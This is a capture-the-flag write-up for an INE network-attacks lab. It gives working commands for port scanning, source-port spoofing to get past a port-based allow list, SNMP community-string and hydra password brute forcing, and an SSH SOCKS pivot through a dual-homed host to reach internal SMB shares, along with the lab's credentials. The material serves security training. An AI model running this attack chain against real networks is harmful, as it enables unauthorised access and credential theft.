# INE Network-Based Attacks CTF
**Target:** `target1.ine.local` (perimeter host), plus an internal host reached only through it
**Tools:** `nmap`, `ncat`, `nbtscan`/`nmblookup`, `smbclient`, `onesixtyone`/`snmpwalk`, `hydra`, `ssh` + `proxychains`
---
##Step 0: Scan the perimter host
```
nmap -p- -sC -sV <target-ip> -O -oX <filename>
```
<img width="940" height="752" alt="image" src="https://github.com/user-attachments/assets/5fb4814c-85b0-42a8-800b-ecd38bbc1cbc" />

**Results:**

Port        Service
22          SSH(OpenSSH)
139/445     Samba(two separate instances/workgroups — `ASHCROFT')
199         smux
13337       unknow


all version probes on 13337 got a response for every probe type, all saying the sae thing.

That single line is the whole puzzle for Task1
---
---
#FLAG1:  Getting the diagnostic token(source-port spoofing)
##WHat I did
A plain connnection confirmed the denial
```
nc -nv -p199 <target-ip>
```
<img width="931" height="265" alt="image" src="https://github.com/user-attachments/assets/60b01adf-d5bf-42e3-8db0-29800116b55b" />


Port 199 seemed like an obvious guessgiven the service's own hint about a `mgmt source port` - but was still refused. i tried a different trusted source-port instead.

```
sudo ncat -v --source-port 53 <target-ip> 13337
```
<img width="826" height="213" alt="image" src="https://github.com/user-attachments/assets/a76a6f3c-9acc-4247-8a14-2f61f8e5ef53" />

**Why Port 53:** Many internal firewalls and services allow-lists treat traffic **from** port 53 (DNS) as inherently trusted, since DNS servers reply from that port and that traffic is rarely blocked.This "NETDIAG" service was clearly built to trust only connections that claim to originate form a recognised management port - and 53 was accepeted where 199 was not.

**How it works:** `ncat --source-port`(like `nc-p`) lets you choose the local TCP source port a connnection is made from, instead of letting the OS pick one at random. Normally this doesn't matter, but a service chekcs the *Clients* port number as a (weak) form of access control can be tricked simply by choosing the port it expects.
**Results:** The service responded with: 
<img width="931" height="265" alt="image" src="https://github.com/user-attachments/assets/869949b8-c48c-4c21-9aee-6c8d0e46b629" />



It also told me exactly what flag2 needs: **SNMPv1 is enabled on this host**.
---
---
##FLAG2 : interrogating the managemnt layer(SNMp)

##WHAT I DID
```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <target-ip>
```
<img width="940" height="469" alt="image" src="https://github.com/user-attachments/assets/4cd195be-c181-4830-a47e-68c7a22794b6" />

**WHY:** SNMPv1 has no rela authentication, just a shared `community string` that acts like a password, and it's commonly guessable. `onesixtyone` is builty specifically to bruteforce commmunity strings quickly against a target.
**Result:** The commmunity string **`mngt`** worked
```
snmpwalk -v2c -c mngt <target-ip> 1.3.6.1.4.1.8072.1.3.2
```
<img width="940" height="532" alt="image" src="https://github.com/user-attachments/assets/1dc45dd7-e33f-4812-9565-cd67ef398d57" />


**How it works:** The OID i queried ('1.3.6.1.4.1.8072.1.3.2') is the **NET-SNMP-EXTEND-MIB** subtree, which is exposes the output of arbitrary shell commands the administrator has configured SNMP to run and report on, essentiallly a backdoor for legitimate monitoring, but readable by anyone who has the community string.
**Results:** the walk revealed the outpu of commmands including `/bin/cat/etc/snmp/flag2`, and a maintanance note left as one of the monitored values:
<img width="940" height="532" alt="image" src="https://github.com/user-attachments/assets/7ab3c1ce-98d0-474d-a38f-27766ff85038" />


This also names the account for later tasks: **`svc_backup`**, with both SMB nad SSH access.
---
##FLAG 3: Enumerating file services without credentials

##What I did
```
smbclient -L //<target-ip>
```
<img width="940" height="365" alt="image" src="https://github.com/user-attachments/assets/1359ec20-f747-47df-ad6b-6af766215dd2" />


**Why:** `-L` with no credentials lists whatever shares the server allows anonymous clinets to see.
**Results:** two commmon share, 'public'and 'backup. The server identified itself as 'BR-EDGE01' in worksgroup 'ASHCROFT'.
```
smbclient //<target-ip>/public 
```
<img width="940" height="401" alt="image" src="https://github.com/user-attachments/assets/b7274f26-0208-42c7-b3b7-3f10703be811" />

**Results:** 'public' held a single file, 'notice_to_staff.txt'.
<img width="940" height="213" alt="image" src="https://github.com/user-attachments/assets/086e9a77-ef1f-45f2-ab7f-95d01e7d9efa" />

---
##FLAG4

##WHAT I DID
with `svc_backup` already named by the SNMP note, i confirmed the account exists and then targeted it specifically:
```
nmap --script smb-enum-users <target-ip>
```
<img width="921" height="553" alt="image" src="https://github.com/user-attachments/assets/33358e97-b406-486e-8418-548205427683" />



```
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <target-ip>
```
<img width="940" height="597" alt="image" src="https://github.com/user-attachments/assets/3cbf3817-3b55-4621-a480-54b65b44ea92" />

**Why:** rather than guess at random accounts. I built a small username list containing `svc_backup`(and other likely names) since SNMP has already told me exactly which account to target, and ran it against a standard password wordlist.
**Result:** `svc_backup: chocolate` succeeded.
```
smbclient //<target-ip>/backup -U svc_backup
```

```
smb: \> more flag4.txt
```
**Result:** the share contained:
<img width="940" height="272" alt="image" src="https://github.com/user-attachments/assets/f3e77314-8bd1-4f10-afbb-90351509c731" />


this is the key to flag : theres a second, ineternal-only host(`file 02' /'target2.ine.local`) taht will only accept connnections whicih originate form `BR-EDGE01` itself. Meaning i need to pivot **through** this box, not just connnect to it directly.
---

##FLAG 5: Reaching the internal file server(pivoting)
##What i did
```
ssh svc_backup@target.ine.local
ip a
ip route
getent hosts target2.ine.local
```
<img width="940" height="525" alt="image" src="https://github.com/user-attachments/assets/d3eb0f78-a986-4701-84b0-e447b31e43b1" />

**why:** the restricted share's note said FILE02 only accepts connections from BR-EDGE01, so i needed to actually be making requests that oroiginate from that host's own network interface, not just know its IP.
**Results:** 'target1' turned out to be **dual-homed**. one interface(`eth0`,`192.184.117.3/24`) facing where I connnect from, and a second (`eth1`, `192.200.215.2/24`) facing an internal network where 'target2.ine.local' actually lives. this confirms BR-EDGE01 is acting as a gateway host between the two network.
##Setting up the host
```
ssh -D 1080 svc_backup@<target1-ip>
```
<img width="940" height="470" alt="image" src="https://github.com/user-attachments/assets/6870cb62-85dd-45ff-ac86-025e0fc24375" />

**How it works:** `-D 1080` turns this ssh connection into a **SOCK proxy** listening on my local machine's port 1080. Any application that sends its traffic through that SOCKS proxy will have its connection tunnelled over the existing SSH session and come out the *other end*. from target1.ine.local own network interface, instead of from machine directly. This is exactly what's needed to reach `target2.ine.local`, since it only trusts connnection that originate from BR-EDGE01.
```
nano /etc/proxychains4.conf
#sock5 127.0.0.1 1080
```
<img width="940" height="735" alt="image" src="https://github.com/user-attachments/assets/02014e3e-5860-484a-9f35-0c6258ad0772" />

**Why proxychains:** most ordinary tools(like `smbclient`) dont have built-in SOCKS proxy support. `proxychains` transparently forces any command's network connection through the configured proxy instead, so `smbclient` can be used unmodified.

```
proxychains smbclient -L //192.200.215.3
```
<img width="940" height="678" alt="image" src="https://github.com/user-attachments/assets/b35f7137-1b45-470b-bdc6-7fe8fa2ede25" />

**Results:** routed through he pivot, I could now see `target2.ine.local` shares: `dropbox` and `sql-backups`.

```
proxychains smbclient //<target-ip>/dropbox
```
```
smb: \>more README.txt
```
<img width="940" height="391" alt="image" src="https://github.com/user-attachments/assets/16ed0579-d23a-43e3-980d-8a20135b4d0b" />

**Results:**
[<img width="904" height="523" alt="image" src="https://github.com/user-attachments/assets/dbd26bd1-f195-487c-8727-03b6ffd00c3e" />

---
##FLAG 6: Breaking into the restricted databse share
##What I did



The dropbox README handed over the credentials directly 
```
proxychains smbclient //target2.ine.local/sql-backups -U db_admin
#Password: Sql!Backup2024
```
<img width="940" height="372" alt="image" src="https://github.com/user-attachments/assets/6b781b93-01e2-4f93-9fab-6b8c2be85730" />

```
smb: \> moe db_export.txt
```
**Results:**
<img width="940" height="241" alt="image" src="https://github.com/user-attachments/assets/35cd2f23-0f18-456b-bdf0-b15f8190daec" />
---

## Attack chain

```
target1.ine.local / BR-EDGE01 (perimeter host, dual-homed)
  |
  |-- Port 13337 "NETDIAG" -> source-port spoof (53) -> diagnostic token ....... FLAG 1
  |
  |-- Hint: SNMPv1 enabled -> onesixtyone finds community "mngt"
  |        -> snmpwalk NET-SNMP-EXTEND-MIB -> flag + "svc_backup" account ...... FLAG 2
  |
  |-- Anonymous SMB -> "public" share -> notice_to_staff.txt ................... FLAG 3
  |        -> names the restricted "backup" share
  |
  |-- hydra -> svc_backup:chocolate -> "backup" share
  |        -> internal host FILE02 (target2) only reachable FROM this host ..... FLAG 4
  |
  |-- SSH as svc_backup -D 1080 (SOCKS proxy) + proxychains
  |        -> pivot into internal network (192.200.215.0/24)
  |        -> target2 "dropbox" share (guest-readable)
  |                -> README.txt: internal token + db_admin credentials ........ FLAG 5
  |
  '-- target2 "sql-backups" share, db_admin:Sql!Backup2024
           -> db_export.txt ................................................... FLAG 6
```
